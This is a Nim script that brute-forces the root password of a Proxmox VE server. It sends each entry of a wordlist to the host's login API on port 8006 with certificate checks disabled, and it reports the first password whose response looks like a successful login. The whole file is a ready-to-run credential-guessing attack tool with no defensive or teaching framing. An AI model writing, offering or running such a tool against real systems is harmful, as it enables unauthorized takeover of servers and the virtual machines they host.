import std/[os, httpclient, json, net, strutils]

proc usage() =
    echo "USAGE"

proc attack(target, pass_list: string) =
    echo "✅ start attack"
    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
    var http_target = "https://" & target & ":8006/api2/extjs/access/ticket"
    echo "🎯 " & http_target
    for line in lines pass_list:
        client.headers = newHttpHeaders({ "Content-Type": "application/json" })
        let body = %*{
            "username": "root",
            "password": line,
            "realm": "pam",
            "new-format": "1"
        }
        let response = client.request(http_target, httpMethod = HttpPost, body = $body)
        if len(response.body) > 77:
            echo "Password is 👉 " & line
            quit 0

var argv = paramCount()
var pass_list: string
var target: string

for arg in countup(1, argv):
    case paramStr(arg)
        of "-p":
            pass_list = paramStr(arg+1)
        of "-t":
            target = paramStr(arg+1)
        of "--help":
            usage()
            quit 0

if len(pass_list) == 0:
    echo "❌ Missing password list"
    quit 1

if len(target) == 0:
    echo "❌ Missing target"
    quit 1

attack(target, pass_list)